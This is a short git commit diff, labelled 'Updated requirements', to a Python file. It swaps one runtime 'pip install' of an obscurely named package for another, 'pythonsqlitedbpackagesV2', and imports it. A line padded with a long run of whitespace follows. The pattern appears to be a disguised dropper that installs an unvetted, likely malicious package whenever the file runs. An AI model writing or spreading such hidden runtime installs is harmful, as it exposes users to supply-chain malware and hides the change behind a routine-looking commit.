b2f216ec1a86903d04b88d82abc83b78201ed8d1
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-18 09:08:53 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlipackages")
-import pipsqlipackages
+os.system("pip install pythonsqlitedbpackagesV2")
+import pythonsqlitedbpackagesV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
